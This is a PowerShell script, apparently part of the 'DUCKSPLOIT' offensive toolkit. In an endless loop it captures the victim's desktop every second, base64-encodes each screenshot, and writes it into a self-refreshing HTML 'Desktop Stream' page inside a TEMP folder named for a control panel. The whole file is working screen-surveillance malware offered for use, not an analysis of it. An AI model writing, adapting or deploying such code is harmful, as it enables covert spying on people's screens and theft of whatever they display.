Add-Type -AssemblyName System.Windows.Forms
$screen_cnt  = [System.Windows.Forms.Screen]::AllScreens.Count
$col_screens = [system.windows.forms.screen]::AllScreens

$string = @"
<html>
    <head>
        <title>Streaming Desktop - DUCKSPLOIT</title>
		<link rel="icon" type="image/x-icon" href="https://github.com/canarddu38/DUCKSPLOIT/blob/root/images/icon.ico?raw=true">
    </head>
    <body style="background-color:black;">
	<!-- text-align: center; -->
        <h1 style="color:white"><strong>DuckSploit - Desktop Stream</strong></h1>
		<img id="img" src="data:image/png;base64, <base64>" alt="image" width="600" height="300"/>
<script>
document.body.style.zoom="900%"
var intervalId = window.setInterval(function(){
	location.reload();
}, 1000);
</script>
    </body>
</html>
"@

$info_screens = ($col_screens | ForEach-Object {
$width = "$($_.Bounds.Width)"
$height = "$($_.Bounds.Height)"
}
)


while (1 -eq 1 ){
[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
function screenshot([Drawing.Rectangle]$bounds, $path) {
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
   $graphics = [Drawing.Graphics]::FromImage($bmp)

   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

   $bmp.Save($path)

   $graphics.Dispose()
   $bmp.Dispose()
}

# dimensions
$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $width, $height)
# output_path
screenshot $bounds "$env:TEMP/host/host/pannel/temp/last.jpg"
$base64 = [convert]::ToBase64String((get-content "$env:TEMP/host/host/pannel/temp/last.jpg" -encoding byte))
$string.replace('<base64>',$base64) | Out-File -FilePath "$env:TEMP\\host\\host\\pannel\\desktop_stream.html"
start-sleep -seconds 1
}
